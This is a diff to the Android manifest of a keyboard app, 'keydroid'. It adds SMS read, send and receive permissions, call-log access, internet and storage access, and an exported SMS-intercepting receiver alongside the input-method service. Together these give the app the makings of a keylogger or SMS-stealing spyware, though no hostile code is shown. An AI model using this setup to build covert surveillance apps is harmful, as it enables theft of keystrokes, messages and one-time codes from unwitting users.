@@ -1,6 +1,13 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.example.keydroid">
 
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+
     <application
         android:allowBackup="true"
         android:icon="@mipmap/ic_launcher"
@@ -10,16 +17,23 @@
         android:theme="@style/AppTheme">
         <activity android:name='com.example.keydroid.MainActivity'>
             <intent-filter>
-                <category android:name='android.intent.category.LAUNCHER'/>
-                <action android:name='android.intent.action.MAIN'/>
+                <category android:name='android.intent.category.LAUNCHER' />
+                <action android:name='android.intent.action.MAIN' />
             </intent-filter>
         </activity>
-
-        <service android:name="com.example.keydroid.SimpleIME"
+        <receiver android:name="com.example.keydroid.SmsListener" android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+        <service
+            android:name="com.example.keydroid.SimpleIME"
             android:label="@string/simple_ime"
-            android:permission="android.permission.BIND_INPUT_METHOD"
-            >
-            <meta-data android:name="android.view.im" android:resource="@xml/method"/>
+            android:permission="android.permission.BIND_INPUT_METHOD">
+            <meta-data
+                android:name="android.view.im"
+                android:resource="@xml/method" />
             <intent-filter>
                 <action android:name="android.view.InputMethod" />
             </intent-filter>
